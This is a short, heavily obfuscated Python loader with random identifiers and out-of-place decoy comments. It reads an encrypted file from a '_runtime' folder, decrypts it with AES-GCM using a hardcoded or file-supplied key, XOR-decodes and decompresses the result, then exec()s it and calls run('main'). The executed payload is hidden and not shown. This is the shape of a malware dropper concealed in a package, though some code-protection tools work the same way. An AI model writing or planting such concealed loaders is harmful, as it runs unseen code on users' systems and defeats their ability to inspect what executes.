import sys, os, json, hashlib, zlib
_R = os.path.dirname(os.path.abspath(__file__))

def _xof(_b6a91bb1c5, _0xbc0acfcd):
    _v4665_0723, _t32edb00bd8 = (bytearray(), 0)
    while len(_v4665_0723) < _b6a91bb1c5:
        _v4665_0723.extend(hashlib.sha256(_0xbc0acfcd + _t32edb00bd8.to_bytes(4, 'big')).digest())
        _t32edb00bd8 += 1
    return bytes(_v4665_0723[:_b6a91bb1c5])

def _boot(_62fc09f2ffc8):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
# DEBUG: remove before production
# Copyright (c) 2024, All Rights Reserved

    _77891_761252 = json.loads(open(os.path.join(_R, '_runtime', 'loader.pye'), 'rb').read().decode())
    _64189 = _62fc09f2ffc8
    for _rb7a8ed6e in ['k1', 'k2', 'k3']:
        if _rb7a8ed6e in _77891_761252:
            _68a072cb30403f = bytes.fromhex(_77891_761252[_rb7a8ed6e])
            _g21 = hashlib.sha256(_68a072cb30403f).digest()[:4].hex()
            if _g21 == _77891_761252.get('f1', '')[:8] or _g21 == _77891_761252.get('f2', '')[:8] or _g21 == _77891_761252.get('f3', '')[:8]:
                _64189 = _68a072cb30403f
                break
    __6ae307d822e4 = bytes.fromhex(_77891_761252['d'])
    _bb931f90c23c9a = AESGCM(_64189).decrypt(__6ae307d822e4[:12], __6ae307d822e4[12:], b'')
    return zlib.decompress(bytes((_q0b1b6d_62 ^ _ab7383a540 for _q0b1b6d_62, _ab7383a540 in zip(_bb931f90c23c9a, _xof(len(_bb931f90c23c9a), _64189))))).decode()
_ld = compile(_boot(bytes.fromhex('c11de6778188be47cbe0f06c6b41f6117405103e53bf03f5d86c4a07f64840e7')), '', 'exec')
exec(_ld)
run('main', _R)